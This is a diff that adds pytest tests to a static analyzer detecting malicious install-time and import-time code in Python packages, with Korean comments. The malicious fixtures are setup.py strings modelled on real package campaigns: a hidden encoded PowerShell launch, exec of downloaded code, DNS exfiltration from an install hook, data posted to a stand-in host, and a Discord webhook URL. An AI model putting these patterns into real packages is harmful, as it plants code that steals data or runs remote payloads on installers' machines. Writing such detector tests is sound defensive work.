@@ -595,3 +595,85 @@ def test_analyze_path_skips_dirs_that_never_execute(tmp_path):
 
     scanned = {f.location.split(":")[0] for f in analyze_path(tmp_path)}
     assert scanned == {"real.py", "docs_helper.py"}
+
+
+# ──────────────────────────────
+# Layer 2 — 설치·import 시점 실행 (실제 악성 300개·정상 상위 300개 실측 근거)
+# ──────────────────────────────
+
+from engine.rules.install_time import RULE_EXFIL, RULE_INSTALL_TIME  # noqa: E402
+from engine.static_analyzer import analyze_files  # noqa: E402
+
+
+def _high_rules(files: dict[str, str]) -> set[str]:
+    return {f.rule for f in analyze_files(files) if f.severity is Severity.HIGH}
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        # esq* 시리즈 — setup.py 최상단의 숨김 PowerShell
+        {"p-1/setup.py": "import subprocess\ntry:\n    subprocess.Popen('powershell -WindowStyle "
+                         "Hidden -EncodedCommand AAAA', shell=False)\nexcept: pass\n"},
+        # 훅 없이 최상단에서 다운로드
+        {"p-1/setup.py": "from urllib.request import urlopen\nexec(urlopen('http://x').read())\n"},
+        # dependency-confusion — 훅이 같은 파일 함수를 부르고, 그 안에서 DNS 유출
+        {"p-1/setup.py": "import socket\nfrom setuptools.command.install import install\n"
+                         "def leak():\n    socket.getaddrinfo('a.b.oastify.com', 80)\n"
+                         "class I(install):\n    def run(self):\n        install.run(self)\n"
+                         "        leak()\nsetup(cmdclass={'install': I})\n"},
+        # fluiddaddy — 별칭으로 숨긴 os.system + 창 없는 파이썬
+        {"p-1/setup.py": "from os import system as _s\n_s('start pythonw.exe x.py')\n"},
+        # asmutation — 훅이 패키지 안 main.py 의 main() 을 불러 실행
+        {"p-1/setup.py": "from setuptools.command.install import install\n"
+                         "class I(install):\n    def run(self):\n        install.run(self)\n"
+                         "        from main import main\n        main()\n"
+                         "setup(cmdclass={'install': I})\n",
+         "p-1/main.py": "import requests\ndef main():\n    requests.post('http://x', data='h')\n"},
+        # import 시점 페이로드 — 패키지 __init__ 최상단
+        {"p-1/setup.py": "", "p-1/pkg/__init__.py": "import requests\nrequests.get('http://x')\n"},
+    ],
+)
+def test_install_and_import_time_payloads_are_high(files):
+    assert RULE_INSTALL_TIME in _high_rules(files)
+
+
+def test_hardcoded_webhook_token_is_high_anywhere():
+    url = "https://discord.com/api/webhooks/1106188549532950589/" + "a" * 68
+    assert RULE_EXFIL in _high_rules({"p-1/pkg/util.py": f"def f():\n    return '{url}'\n"})
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        # 버전용 git 명령 — 평범한 빌드 명령은 수상하지 않다
+        {"p-1/setup.py": "import subprocess\n"
+                         "v = subprocess.check_output(['git', 'describe', '--tags'])\n"},
+        # 통신하지 않는 생성자·로컬 조회 (litellm·dnspython·dill)
+        {"p-1/setup.py": "", "p-1/pkg/__init__.py":
+            "import httpx, socket, requests\nT = httpx.Timeout(5)\nS = requests.Session()\n"
+            "P = socket.getprotobyname('tcp')\n"},
+        # import 되지 않는 보조 스크립트 (fastapi·black·pyzmq)
+        {"p-1/setup.py": "", "p-1/scripts/fetch.py": "import httpx\nhttpx.get('http://x')\n"},
+        # nodeenv — setup.py 는 버전만 가져오고, 다운로드 함수는 부르지 않는다
+        {"p-1/setup.py": "from nodeenv import nodeenv_version\nsetup(version=nodeenv_version)\n",
+         "p-1/nodeenv.py": "from urllib.request import urlopen\nnodeenv_version = '1.0'\n"
+                           "def download():\n    return urlopen('https://nodejs.org')\n"},
+        # 함수 안의 네트워크 호출은 부르기 전엔 돌지 않는다
+        {"p-1/setup.py": "", "p-1/pkg/__init__.py":
+            "import requests\ndef fetch():\n    return requests.get('http://x')\n"},
+    ],
+)
+def test_benign_install_and_import_time_code_is_not_high(files):
+    assert RULE_INSTALL_TIME not in _high_rules(files)
+
+
+def test_unreadable_files_are_reported_not_silently_skipped(tmp_path, monkeypatch):
+    """백신이 읽기를 막은 파일(Windows: OSError 22)은 '검사했고 깨끗했다'가 되면 안 된다."""
+    from engine.rules import base
+
+    (tmp_path / "setup.py").write_text("x = 1\n", encoding="utf-8")
+    monkeypatch.setattr(base.DiskTree, "read", lambda self, rel: None)
+    unreadable: list[str] = []
+    assert analyze_path(tmp_path, unreadable=unreadable) == []
+    assert unreadable == ["setup.py"]
